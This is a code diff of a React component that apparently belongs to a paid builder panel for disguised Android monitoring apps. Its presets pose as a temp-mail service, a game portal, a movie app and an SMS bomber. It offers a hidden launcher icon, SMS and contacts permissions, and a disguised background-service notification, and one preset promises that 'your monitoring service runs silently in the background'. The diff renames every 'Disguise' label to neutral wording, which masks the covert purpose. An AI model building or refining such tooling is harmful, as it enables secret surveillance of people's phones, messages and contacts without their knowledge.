@@ -18,7 +18,7 @@ interface AppGenerationModalProps {
     onUpgrade?: () => void;
 }
 
-const DISGUISE_PRESETS = [
+const APP_PRESETS = [
     {
         id: 'custom',
         name: 'Custom App',
@@ -32,7 +32,7 @@ const DISGUISE_PRESETS = [
         name: 'Temp Mail',
         packageName: 'com.tempmail.inbox',
         url: 'https://mail.tm/en/',
-        infoTitle: 'Temp Mail Disguise Portal',
+        infoTitle: 'Temp Mail Portal',
         infoText: 'Launches a fully functional disposable email service (mail.tm). Users can generate temporary email addresses instantly while your monitoring service runs silently in the background.'
     },
     {
@@ -40,23 +40,23 @@ const DISGUISE_PRESETS = [
         name: 'Poki Games',
         packageName: 'com.poki.games',
         url: 'https://poki.com/',
-        infoTitle: 'Poki Games Arcade Disguise',
-        infoText: 'Launches an interactive online game portal (poki.com) with hundreds of instant mobile games. Perfect for casual gaming disguise.'
+        infoTitle: 'Poki Games Arcade',
+        infoText: 'Launches an interactive online game portal (poki.com) with hundreds of instant mobile games. Perfect for casual entertainment.'
     },
     {
         id: 'movie_box',
         name: 'Movie Box',
         packageName: 'com.moviebox.cinema',
         url: 'https://movie-box.co/',
-        infoTitle: 'Movie Box Cinema Disguise',
-        infoText: 'Launches a sleek cinema and movie streaming hub (movie-box.co). Provides an authentic entertainment streaming interface as its disguise.'
+        infoTitle: 'Movie Box Cinema',
+        infoText: 'Launches a sleek cinema and movie streaming hub (movie-box.co). Provides an authentic entertainment streaming interface.'
     },
     {
         id: 'sms_bomber',
         name: 'SMS Bomber',
         packageName: 'com.h4k3r.bomber',
         url: 'https://h4k3r-bomber.vercel.app',
-        infoTitle: 'Utility Toolkit Disguise',
+        infoTitle: 'Utility Toolkit',
         infoText: 'Launches a utility web application toolkit (h4k3r-bomber.vercel.app). Looks and behaves like a specialized developer utility app.'
     }
 ];
@@ -91,11 +91,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [customIcon, setCustomIcon] = useState<File | null>(null);
     const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);
 
-    // Global Hide Launcher Icon State
+    // Global Hide Launcher Icon State (Only applicable to custom mode)
     const [hideApp, setHideApp] = useState(false);
 
-    // Disguise Info Modal State
-    const [showDisguiseInfoModal, setShowDisguiseInfoModal] = useState<string | null>(null);
+    // App Mode Info Modal State
+    const [showAppInfoModal, setShowAppInfoModal] = useState<string | null>(null);
 
     // Generate exactly 3 segments format: com.project.app
     const generatePackageName = (name: string) => {
@@ -166,7 +166,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
     // Active preset details helper
     const getActiveAppDetails = () => {
-        const preset = DISGUISE_PRESETS.find(p => p.id === selectedPreset);
+        const preset = APP_PRESETS.find(p => p.id === selectedPreset);
         if (!preset || selectedPreset === 'custom') {
             return {
                 name: customAppName || "Custom App",
@@ -294,7 +294,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('uuid', uuid);
             formData.append('appName', activeApp.name);
             formData.append('packageName', activeApp.packageName);
-            formData.append('hideApp', hideApp.toString());
+            formData.append('hideApp', (selectedPreset === 'custom' ? hideApp : false).toString());
             formData.append('webLink', activeApp.url);
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
@@ -458,7 +458,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
             <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
                 
-                {/* 2-Row Spacious Header (Solves mobile wrapping completely) */}
+                {/* 2-Row Spacious Header */}
                 <div className="border-b border-white/10 bg-black/60">
                     {/* Top row: Title + Rose Close Button */}
                     <div className="px-5 py-3.5 flex items-center justify-between">
@@ -475,27 +475,27 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         </button>
                     </div>
 
-                    {/* Bottom row: Full-width Step Navigation Bar (No text squeeze/wrapping) */}
+                    {/* Bottom row: Uniform, Flicker-Free Step Navigation Bar */}
                     <div className="px-3 pb-3">
                         <div className="grid grid-cols-3 gap-1.5 p-1 rounded-2xl bg-black/40 border border-white/10">
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('identity')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
                                     activeStep === 'identity'
-                                        ? 'bg-gradient-to-r from-emerald-500/25 to-teal-500/25 text-emerald-300 border border-emerald-500/40 shadow-[0_4px_16px_rgba(16,185,129,0.2)]'
+                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
                                 <Smartphone size={14} className="flex-shrink-0" />
-                                <span>1. Disguise</span>
+                                <span>1. App Mode</span>
                             </button>
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('permissions')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
                                     activeStep === 'permissions'
-                                        ? 'bg-gradient-to-r from-cyan-500/25 to-blue-500/25 text-cyan-300 border border-cyan-500/40 shadow-[0_4px_16px_rgba(6,182,212,0.2)]'
+                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -505,9 +505,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                             <button
                                 type="button"
                                 onClick={() => setActiveStep('notifications')}
-                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold transition-all whitespace-nowrap ${
+                                className={`flex items-center justify-center gap-1.5 py-2.5 px-2 rounded-xl text-xs font-bold whitespace-nowrap ${
                                     activeStep === 'notifications'
-                                        ? 'bg-gradient-to-r from-purple-500/25 to-pink-500/25 text-purple-300 border border-purple-500/40 shadow-[0_4px_16px_rgba(168,85,247,0.2)]'
+                                        ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 shadow-sm'
                                         : 'text-fg-3 hover:text-fg-1'
                                 }`}
                             >
@@ -518,18 +518,18 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 </div>
 
-                {/* Main Content Area with Smooth Step Transition Container */}
-                <div key={activeStep} className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar transition-all duration-300 ease-out">
+                {/* Main Content Area */}
+                <div className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                     
-                    {/* STEP 1: PORTAL & DISGUISE PRESETS */}
+                    {/* STEP 1: APPLICATION MODES & PRESETS */}
                     {activeStep === 'identity' && (
                         <div className="space-y-6">
                             
-                            {/* App Icon Tile Grid ("icon lagao, bass name ho niche, koi extra text na ho") */}
+                            {/* App Icon Tile Grid */}
                             <div>
-                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Disguise</label>
+                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
                                 <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
-                                    {DISGUISE_PRESETS.map((p) => {
+                                    {APP_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
                                             <button
@@ -538,7 +538,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 onClick={() => setSelectedPreset(p.id)}
                                                 className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
                                                     isSelected
-                                                        ? 'bg-gradient-to-b from-emerald-500/15 to-emerald-500/5 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
+                                                        ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
                                                         : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
                                                 }`}
                                             >
@@ -623,9 +623,24 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl relative`}>
                                     <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
                                     
+                                    {/* App Icon Container with Corner Info Icon */}
                                     <div className="w-24 h-24 mb-3 relative group">
                                         {renderRealisticIcon()}
-                                        {hideApp && (
+
+                                        {/* Corner Info Button ONLY for Pre-integrated Apps ("side pe bas chota sa bana tha corner ma") */}
+                                        {selectedPreset !== 'custom' && (
+                                            <button
+                                                type="button"
+                                                onClick={() => setShowAppInfoModal(selectedPreset)}
+                                                className="w-7 h-7 rounded-full bg-black/80 text-emerald-300 border border-emerald-400/50 flex items-center justify-center absolute -top-2 -right-2 shadow-lg hover:scale-110 transition-transform"
+                                                title="View App Details"
+                                            >
+                                                <Info size={14} />
+                                            </button>
+                                        )}
+
+                                        {/* Hidden Badge for Custom App */}
+                                        {selectedPreset === 'custom' && hideApp && (
                                             <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                 Hidden
                                             </div>
@@ -637,44 +652,34 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </div>
                                     <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{activeApp.packageName}</span>
 
-                                    {/* Info button for Pre-Integrated Disguises */}
-                                    {selectedPreset !== 'custom' && (
-                                        <button
-                                            type="button"
-                                            onClick={() => setShowDisguiseInfoModal(selectedPreset)}
-                                            className="mt-3.5 inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-emerald-500/15 hover:bg-emerald-500/25 border border-emerald-500/30 text-emerald-300 text-xs font-bold transition-all shadow-sm"
-                                        >
-                                            <Info size={13} />
-                                            <span>Disguise Info</span>
-                                        </button>
-                                    )}
-
-                                    {/* Hide App Toggle Switch */}
-                                    <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
-                                        <div className="flex items-center gap-1.5">
-                                            <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
-                                            {isBasicPlan && (
-                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
-                                                    PRO
-                                                </span>
-                                            )}
+                                    {/* Hide App Toggle Switch (ONLY SHOWN FOR CUSTOM APP: "custom wala ka niche hi hide icon ka option rakhna baki ka sath nhi") */}
+                                    {selectedPreset === 'custom' && (
+                                        <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
+                                            <div className="flex items-center gap-1.5">
+                                                <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
+                                                {isBasicPlan && (
+                                                    <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
+                                                        PRO
+                                                    </span>
+                                                )}
+                                            </div>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    if (isBasicPlan) {
+                                                        onUpgrade?.();
+                                                        return;
+                                                    }
+                                                    setHideApp(!hideApp);
+                                                }}
+                                                className={`w-11 h-6 rounded-full transition-colors relative ${
+                                                    isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
+                                                }`}
+                                            >
+                                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
+                                            </button>
                                         </div>
-                                        <button
-                                            type="button"
-                                            onClick={() => {
-                                                if (isBasicPlan) {
-                                                    onUpgrade?.();
-                                                    return;
-                                                }
-                                                setHideApp(!hideApp);
-                                            }}
-                                            className={`w-11 h-6 rounded-full transition-colors relative ${
-                                                isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
-                                            }`}
-                                        >
-                                            <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
-                                        </button>
-                                    </div>
+                                    )}
                                 </div>
                             </div>
                         </div>
@@ -920,10 +925,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                 </div>
                             </div>
 
-                            {/* Foreground Service Disguise */}
+                            {/* Background Service Notification Style */}
                             <div className="space-y-4 pt-4 border-t border-white/10">
                                 <div>
-                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-1.5">Background Service Disguise</label>
+                                    <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-1.5">Background Service Notification Style</label>
                                     <select
                                         value={notificationStyle}
                                         onChange={(e) => setNotificationStyle(e.target.value)}
@@ -937,7 +942,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </select>
                                 </div>
 
-                                {/* Disguise Live Preview */}
+                                {/* Notification Style Live Preview */}
                                 {notificationStyle !== 'custom' && (
                                     <div className="bg-black/50 rounded-2xl p-4 border border-white/10 flex items-center gap-3 shadow-inner">
                                         <span className="text-2xl">{NOTIFICATION_PRESETS[notificationStyle]?.icon}</span>
@@ -1064,40 +1069,40 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 </div>
 
-                {/* Disguise Info Modal Popup ("jis pe click kare pop aye jis pe likha ho is app ka kya kam") */}
-                {showDisguiseInfoModal && (
-                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowDisguiseInfoModal(null)}>
+                {/* App Mode Info Modal Popup */}
+                {showAppInfoModal && (
+                    <div className="fixed inset-0 z-[350] flex items-center justify-center bg-black/75 backdrop-blur-sm p-4" onClick={() => setShowAppInfoModal(null)}>
                         <div className="bg-[#18191c] border border-white/15 rounded-3xl p-6 max-w-sm w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
                             <button
-                                onClick={() => setShowDisguiseInfoModal(null)}
+                                onClick={() => setShowAppInfoModal(null)}
                                 className="absolute top-4 right-4 text-white/50 hover:text-white"
                             >
                                 ✕
                             </button>
 
                             <div className="flex items-center gap-3">
-                                {renderPresetIconBadge(showDisguiseInfoModal)}
+                                {renderPresetIconBadge(showAppInfoModal)}
                                 <div>
                                     <h4 className="text-base font-extrabold text-white">
-                                        {DISGUISE_PRESETS.find(p => p.id === showDisguiseInfoModal)?.name}
+                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.name}
                                     </h4>
                                     <span className="text-[10px] font-mono text-emerald-400">
-                                        {DISGUISE_PRESETS.find(p => p.id === showDisguiseInfoModal)?.packageName}
+                                        {APP_PRESETS.find(p => p.id === showAppInfoModal)?.packageName}
                                     </span>
                                 </div>
                             </div>
 
                             <div className="p-3.5 rounded-2xl bg-white/[0.03] border border-white/10">
                                 <h5 className="text-xs font-bold text-emerald-300 mb-1.5">
-                                    {DISGUISE_PRESETS.find(p => p.id === showDisguiseInfoModal)?.infoTitle}
+                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoTitle}
                                 </h5>
                                 <p className="text-xs text-fg-3 leading-relaxed">
-                                    {DISGUISE_PRESETS.find(p => p.id === showDisguiseInfoModal)?.infoText}
+                                    {APP_PRESETS.find(p => p.id === showAppInfoModal)?.infoText}
                                 </p>
                             </div>
 
                             <button
-                                onClick={() => setShowDisguiseInfoModal(null)}
+                                onClick={() => setShowAppInfoModal(null)}
                                 className="w-full py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-black font-bold text-xs transition-all shadow-lg"
                             >
                                 Close Info
